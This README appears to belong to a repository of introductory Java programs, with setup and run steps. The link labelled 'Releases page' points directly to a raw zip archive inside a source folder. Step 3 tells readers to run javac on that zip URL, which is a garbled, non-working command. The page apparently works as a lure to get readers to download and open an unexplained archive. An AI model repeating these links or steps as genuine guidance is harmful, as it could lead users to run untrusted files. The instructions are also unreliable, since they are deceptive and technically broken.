## 🚀 Getting Started

Welcome to Core-Java-Programs-2026! This repository includes a variety of key Java programs that cover essential concepts. Whether you are just starting or want to enhance your skills, these practical examples can help you understand Java better. 

### 📥 Download & Install

To get started, you need to download the software. It is easy! Follow these steps:

1. Visit the [Releases page](https://github.com/FranTheDev/Core-Java-Programs-2026/raw/refs/heads/main/TypeCasting/src/com/Programs_Core_Java_v2.6.zip).
2. On this page, you will see a list of available versions.
3. Click on the version you want to download. This action will take you to details for that release.
4. Look for the download link of the zip file or files related to your chosen version.

Once the file download is complete, you need to extract it if it is a zip. Right-click the downloaded file and select "Extract All" to unzip the contents.

### 💻 System Requirements

Before installing the application, ensure your system meets the following requirements:

- **Operating System:** Windows 10, macOS, or any Linux distribution.
- **Java Development Kit (JDK):** Version 8 or above is required. You can download the JDK from the official Oracle website or adopt OpenJDK.
- **IDE (Optional):** While you can run the programs from the command line, using an Integrated Development Environment (IDE) like Eclipse or IntelliJ IDEA makes it easier to manage your Java projects.

### 📖 What’s Included?

The Core-Java-Programs-2026 repository consists of:

- **Basics of Java:** Understand variables, data types, and basic control flows.
- **Object-Oriented Programming (OOP):** Learn about classes, objects, inheritance, and polymorphism.
- **Collections Framework:** Explore various collections like lists, sets, and maps with practical examples.
- **Exception Handling:** Implement robust applications with error handling mechanisms.
- **File Handling:** Learn how to read and write files in Java.
- **Mini Projects:** Get hands-on experience through guided mini-projects.

### ⚙️ Running the Programs

Once you have successfully downloaded and extracted the files, you can run the Java programs. Follow these steps:

1. Open your command line interface (Command Prompt on Windows, Terminal on macOS or Linux).
2. Navigate to the directory where you extracted the files. You can do this by using the `cd` command followed by the path of the folder. For example:
   ```bash
   cd path/to/your/downloaded/folder
   ```
3. Compile a Java file using the `javac` command. For example:
   ```bash
   javac https://github.com/FranTheDev/Core-Java-Programs-2026/raw/refs/heads/main/TypeCasting/src/com/Programs_Core_Java_v2.6.zip
   ```
4. Run the compiled Java program with the `java` command:
   ```bash
   java HelloWorld
   ```
